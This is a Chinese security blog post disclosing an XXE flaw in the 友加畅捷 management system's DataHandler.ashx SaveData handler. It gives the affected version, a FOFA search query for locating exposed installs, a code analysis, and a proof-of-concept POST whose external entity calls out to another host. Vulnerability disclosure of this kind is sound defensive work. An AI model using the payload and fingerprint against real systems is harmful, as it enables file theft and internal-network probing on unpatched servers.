---
title: "友加畅捷管理系统 DataHandler.ashx XML实体注入（XXE）漏洞"
source: https://mrxn.net/jswz/youjiasoft-Report-DataHandler-xxe.html
asset_dir: assets/友加畅捷管理系统-datahandler.ashx-xml实体注入（xxe）漏洞
---

# 友加畅捷管理系统 DataHandler.ashx XML实体注入（XXE）漏洞

[Mrxn](https://mrxn.net/author/1)- 发表于2025/12/4 08:35
- 461浏览
- [0评论](#comment)
- 10分钟阅读

深入探索

软件

SQL

计算机安全

---

# 漏洞简介

友加畅捷管理系统是一款专为小微商贸流通企业设计的财务业务一体化管理[软件](#)，涵盖进销存、财务、分销及移动管理等多个模块，旨在帮助企业实现高效的业务运营和财务核算。

代码安全审计

该系统DataHandler.ashx下的**SaveData**方法存在 XML实体注入（[XXE](https://mrxn.net/tag/XXE)）漏洞，是由于其在处理XML输入时，未能有效禁用外部实体加载所导致。攻击者可以通过构造恶意的XML数据，并在其中引用外部实体，当系统解析这些未经严格过滤的XML数据时，便会触发漏洞。

成功利用此漏洞可能导致多种严重的安全风险，包括但不限于敏感信息泄露（如读取系统文件）、执行任意系统命令、对内网进行端口扫描、攻击内部网络服务，甚至发起拒绝服务（DoS）攻击等。

# 影响版本

18.8000.1083.1000

# fofa语法

> icon\_hash="2049187099" || fid="zzt8lL7SUwIIZQXZY6rTSw=="

# 漏洞分析

直接查看 `DataHandler.ashx` 的实现逻辑

漏洞预警服务

[![友加畅捷管理系统 DataHandler.ashx XML实体注入（XXE）漏洞](images/img-001-a27132e78be5.webp)](https://image.mrxn.net/62a60bc4c9ba46119357f31b8a682f00.webp)

根据参数`Type`的值进入不同的处理逻辑，当 **Type=SaveData** 时，看下它的实现逻辑

物流软件安全

[![友加畅捷管理系统 DataHandler.ashx XML实体注入（XXE）漏洞](images/img-002-41c9c853d7cb.webp)](https://image.mrxn.net/522af2dd4efa427f818e8d8c386db0e1.webp)

可以看到代码直接使用 `System.Xml.XmlDocument` 的 `LoadXml` 方法解析来自 `context.Request.InputStream` 的用户输入。在默认配置下（尤其是在 .NET Framework 4.5.2 之前的版本，或未进行安全配置时），`XmlDocument` 会解析并执行 XML 中的 DTD（文档类型定义），包括外部实体。攻击者可以构造恶意的 XML 数据，利用此特性读取服务器上的任意文件、探测内网服务（SSRF），或引发拒绝服务攻击（DoS）。

代码安全审计

# 漏洞复现

```
POST /Report/DataHandler.ashx?Type=SaveData HTTP/1.1
Host: youjiasoft.mrxn.net
Content-Type: application/xml

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
<!ENTITY % remote SYSTEM "http://192.168.1.1:8082/xxe_test">
%remote;]>
<root/>
```

[![友加畅捷管理系统 DataHandler.ashx XML实体注入（XXE）漏洞](images/img-003-bdc02d5af955.webp)](https://image.mrxn.net/5c16ed39e4c643b9b2e0dd209893dd7d.webp)

成功收到HTTP响应

文件大小转换

- 标签：
- [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
- [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
- [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
- [#0day](https://mrxn.net/tag/0day)
- [#XXE](https://mrxn.net/tag/XXE)
- [#asp.net](https://mrxn.net/tag/asp.net)

---

文章目录

- [1.漏洞简介](#toc-1-)
- [2.影响版本](#toc-2-)
- [3.fofa语法](#toc-3-)
- [4.漏洞分析](#toc-4-)
- [5.漏洞复现](#toc-5-)

  
  

![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAGQAAABkCAYAAABw4pVUAAALnElEQVR4Aeydi3IjuQ5Dc/b//3mv0RhIlFryIzcz9tZ0yjRIEKQUsduPzFbtP19fX/9+1/6dfl7tk/LU7WLx0dxD6apFW7n4cy7xPUxtsGpXXM0/62sgN+31+JQTaAO5TfjrWZs3D3wBM/0wBo66rJuCORYf7h6C+0m/MnAeWKUPrvY/iNtTuJt7PIBh38ofifIk7lkrZV9tIJW8/PedwGkg4OnDGR9t894VkdqqCQfjWit+xQGhD0xv4LiCD/L2BI6Tr3hLH49wRzA9gesn+qkQXAtnXDU4DWQlurg/dwI/OhA4XwVgLr8SOAbae1Zy967SnQZ6v2ieQeh10P1a+2g/sK6rPV71f3Qgry5+6c8n8KMDyRW1wixdczMHvuLCrxD2GljnsmbtFy5Yc/HB/aIBx8n/DvzRgfyODf5tPX/PQP62U/zB3/c0kNyeK3xlXfDtDcb0A8dwxmieWSfaFe7qoa8ZDZhLXDG9wyVeYTQzrrThZq3i00BEXva+E2gDAV8p8Bhf2W6uBnDfxML0kS8Da8I/g+Aa4CRXTxlwfFGUH4OROxXfCLDm5h4PWMfAka9PwLEmPMZa1wZSyct/3wn8kyvmO5htpxb61RAumlcQ3Cc9hGBu7qNcbM7NMbgH9C+lYG7W1hhGDTjOusLo5f8/dt0hOckPwdNAwNNf7Q+cgzXWKyP1YG1y4YUzlzgozc7AfeGMu5oVn7WC39WA95F6cAyPMTXC00BEXva+E9gOBM6TzTbnq2mOo1sh9L6r/I7LGsHoEgtnDrxW+IrgHBhrLr56yhLfQ+lks0ZcbJcD7wH4T/0D1dff8LO9Q/6GX/4Tf8d/wLfLvLncZiuEdc3c41EMYx8Y41oPzoExOXAM/aNscvPew1eMpnKzD15jx4PzQJOkL9C+IIaLCJxLLLzuEJ3CB1n7YgjjtMAxdMy+n5l0tEFwn8TCuc8cSxO7l4sGzmsoB2v+u7nVXmYOzmuCuWhXeN0hmsoHWXsPybTu7Q08YTCmJgjmgdYmuWBL3Bygvb4CN8YPYOABJ27P6bPCW3p4AEefe9rkwNqhwa8gml/h0RP6e5by4HowipOlRqhYJr8auAa4PvZ+fdhPe8kCT0kTlK32Kb4auCbamgsH1oBxpQkHoyY9KoI1lYs/9wkfBNcCoU5Xe0vcnF2/8DfJ6ZEccPROLIwYnEtcsQ2kkpf/vhO4BvK+s1+u3D72Jgv72wmcA2NqVgiPNamD57WpWSG4j14eqq20NS8/GnAP6Ki87BXNPW1yK7zukNWpvJFrA9EV8KrN+4Z+VSWXnokrJjcjuE/VgrlowTF0jB7MzXFqhWANjKhcbK4Ha8NHJwTnwChOFm1F8bLKxW8DCXHhe0+gDQQ8WTBmW+AYCHV8nIP+xSgJTX024NBH8wzOPWqc+srFT27GR3np72nm3BzX+lVOedmcA59NeGEbiAoue/8JtIFoOtXgPD0YuWwfzCcWgrnaUz6YByRbGnDcVdBxKbyR0DXqL7vRxwN6DkZfOtkhvD3BmIf+CgDOSS8Dx7ey9oCRgzGWEMyBUb1k4Bi4/nTy9WE/7Q6Z96XJyWZeMXii8quBeehXV83vfHBd8lp3NrAGjCstOJfaaILhheGeQellcL//M72kUS+Z/Nm2A5mFV/zSCXxbfA3k20f3ewrbv4eAb8csA46ho26zatGuEFy3yoUDa9IzfBCch/1LIHRN6oLpGwwvBNclF1QuBtYkXmmSC4JrntGmpuJ1h9TT+AD/9MfFe3sCTx9GfKYmmlw5wnDfQfAeVrUw5sAxdJzrwDntK7bTgLXQcaed+VWc9YTXHbI6oTdy7T1E05FlL/JliYWKV6bcbNGFB19NiSuCczBiegjBudSJ21k04JqdTny08mWJK8LYp+biq3ZlyQuTB/cTJwPHwPXF8OvDftpLFnhKz+wP1tpcAcL0kV8tvDC8fFnioLhHBt4L8Eg6/DlmFgNDHpglT8XA0ecp8ULUBrLIXdQbTuAayBsO/d6S7WPv6mViV7jTgm9X2GPtCdaFA8dwxt2a4YXpExQnS7xC8FrS7Sx1MGrDV0yPysWHdX1qhNcdktP6EGwfe5/ZD3jCMOK9Wk292kqb/JwLL5xzMO4BehwtdA76n1/u9UttRell4cB9EwvBHIyo3Ct23SGvnNYf0LaBwDhZcFz3oKukWs3Jr7n44quB+0K/YpOfa6BrZ020FWfNLg4vrPXyxcWgrw/7/c51qhc3m3gZuK98GTgGri+GXx/20z5lZV/zVGscDXiiiaNJvEJwTbTC6MA5MIaXJhYuCNZCxzmXWugasB/tPUz9rFnxMwdeBzruNLV/e8mq5OW/7wROn7KgTxTW/jOThrF2rqm/8i4HvUf0YG5XE50QrJUvS40Qxpzys8GoAcdwxrk2sdaKgesSB6MVXneITuGD7A0D+aDf/gO38vBNfbVn8K0358A8nD8iQs+B/bl+voUTC6OVL5vjyq1yyoPXhf3+UltRtdVqbudHv8pD3wcwSK47ZDiO9wengQAP/56f6d9DcJ9Z891fGdxvrgfzcL7qZ23dC/Q6WNdGD9amX/iKcw7GGuWjl7+z00B2wov/MydwGkimCPsJwzmn7YJ5QOFhwHDHpb8QxhysY+DopSfg6AdGcTEwp94ycAxnVF421yYWguvkrwycB1oaOPYXAhxDx+S0viyx8DQQkZe97wROXwyf2YqmKgNP/ZmaaMA10F+3wVw0Qa0RCzdj8sLkwP3EycLLj4ULhgfXAkm1/4sDMFz9TXDHSV9hZPJliSted0g9jQ/wr4F8wBDqFtoXQ91CMtjfluAcGGsj+aqfTbwMXFPz4lcWDbgG+stbcnNdjWfNHEsL7p0cjLF46WQw5mCMq1a+THWziZeFB/dJLLzuEJ3CB1kbCJynpX1qoo8MXAtnVI9q0DXh0z8xWJO4IjiXGnAMVNngA0+/GYO1sL8rs/awyK8AXP8rHADG3KpPG8hQeQVvO4E2kExrRvBUgbZJYLjiUtMEN2fF3ej2EVJ5cB8wipNJJ5MfUyxLDGNNeCE4B0bVycAx9KtfvEx1s0HXA5IdBgy//0FunsBaoCmAbX0bSFNfzltPoA0EPDUYcbW7XEkwasMLUydflvgVhN4/dWBOPWXgGDqKl6VGviyxELoe1r50MtXK5FeDXld5+dLL5M8mXgaulx9rA5mLrvg9J9D+dJIJBe9tBzzZWQPmoWM06QuPc9GmVgiuky+DMRYXA+fmPokrpqZy8ZMD90u8Qhg1MMaqmfsmBmuB67/L+vqwn+sl6+5A/nyy/elkXjq3U8VoKic/fEXxMui3I1AlzQeGj4HgWPWxJv7lhF/hL8kJwH2h4yyCfS7arJlYGG5G5WLg3olXeN0hq1N5I9fe1MHTg+dx3ne9OuZc4nuampOfGqFimfxq0Pdb+eqDNaqPJZ8Yzprkon0GwX1W2vQDa8BYtdcdUk/jA/w2kEzvGdztGzxxoEnmfi1RnGhCAcd7CnRMbsbUCuccuF45GTgGmhQ41goBjqHjLhe+otaRVS4+uKfy1ZIXtoEouOz9J3AaCHiKcMbddjPtVR7GPlWTOlhrkheCNakHx3DGaFQnS7xC5WXJyY+FC+545eG8D0CpZrv68MLTQFr15bzlBK6BvOXY94v+6EB0y8WA4c0yfN0KjJrkogXn4bl/v0hdEFyfvvdwroHzms/Up09wVRMOvD/o+KMDyUIXfv8EfmQg4AnXbeQKCcJek7p7WhjrYYzTQwjOzf0SC6VbmXKxVV7co7w09wy8v5XmRwayanxx3zuB00Ay/RXuloi25sFXARhXmuiTg702mtQEwTVAqBPuaqsQGN7zai4+PNZEG8zaQnC9/J2dBpJGF77nBNpAwNODx7jbKvTa+QoA52otnLmaX/npu8qFmzVwXicaGHPgGDqmbxCcSw9hcjOCtbD/1AZd0wYyN7ri95zANZD3nPt21f8BAAD//1p5HaIAAAAGSURBVAMA4NqZoeFROJ0AAAAASUVORK5CYII=)

手机扫码阅读
